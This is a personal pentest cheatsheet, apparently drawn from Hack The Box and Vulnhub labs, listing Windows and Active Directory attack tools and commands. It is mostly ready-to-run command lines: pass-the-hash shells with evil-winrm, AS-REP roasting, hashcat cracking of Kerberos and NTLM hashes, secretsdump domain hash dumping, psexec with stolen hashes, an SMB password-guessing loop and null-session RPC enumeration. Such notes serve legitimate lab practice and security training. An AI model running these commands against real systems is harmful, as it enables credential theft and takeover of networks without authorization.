# pentest cheatsheet

> personal cheathsheet populated via my [HTB](https://www.hackthebox.eu/) and [Vulnhub](https://www.vulnhub.com/) experience.

## Windows

- MUST SEE: [VbScrub - Tutorials](https://www.youtube.com/playlist?list=PL3B8L-z5QU-Yw80HOGXXUASBfv_K1WwO5)

### Tools

- [LOLBAS](https://lolbas-project.github.io/#) _(GTFOBins version Windows)_
	+ [GTFOBLookup](https://github.com/nccgroup/GTFOBLookup): offline command line lookup utility
- [PEASS - Privilege Escalation Awesome Scripts SUITE](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite#peass---privilege-escalation-awesome-scripts-suite)
	+ [WinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) _(Une sorte de LinEnum pour Windows)_
- [mimikatz](https://github.com/gentilkiwi/mimikatz#mimikatz)
- [dnSpy](https://github.com/0xd4d/dnSpy#dnspy---latest-release---%EF%B8%8F-donate): debugger and .NET assembly editor.
- [BloodHound](https://github.com/BloodHoundAD/Bloodhound/wiki): reveal the hidden and often unintended relationships within an Active Directory environment. 
- [PowerSploi](https://github.com/PowerShellMafia/PowerSploit): PowerShell Post-Exploitation Framework

### Shell

- `evil-winrm -i <ip> -u <username> -p <password>`
- PassTheHash: `evil-winrm -i <ip> -u <username> -H <NTLM_HASH>`

```powershell
*Evil-WinRM* PS C:\> NET USER # list users
```

### LDAP

- `ldapsearch -h <IP> -x -s base namingcontexts` 
- `ldapsearch -h <IP> -x -b "<distinguishedName>" | grep "^dn"`

### Kerberos

- `python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <distinguishedName>/<username> -request -dc-ip <IP> [-no-pass -usersfile users.txt]`
- Kerberos 5 AS-REP etype 23 `hashcat -m 18200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt`. See [hashcat wiki](https://hashcat.net/wiki/doku.php?id=hashcat) and [**hackndo** - kerberos as-rep roasting (fr)](https://beta.hackndo.com/kerberos-asrep-roasting/)

#### Privesc

> _`reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"`_

1. `python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -just-dc-ntlm <domainName>/<admin-user>@<IP>`
2. `python3 /usr/share/doc/python3-impacket/examples/psexec.py -hashes <NTLMhash> administrator@<IP> cmd.exe`

### Samba

- `smbclient -L //<IP>/<Sharename> -U "username%password"`
- `for u in $(cat usernames.txt); do echo "User: $u"; smbclient -L //<IP>/ -U "$u%$u"; done`

### RPC

```bash
rpcclient -U "" $IP
<empty password>
rpcclient $> srvinfo       # identify the specific OS version
rpcclient $> enumdomusers  # display a list of users names defined on the server
rpcclient $> getdompwinfo  # get SMB password policy
rpcclient $> querydispinfo # get users info
```

### Misc

- Crack NTML hashes: `hashcat -a 0 -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt`

## Linux

> **TODO**
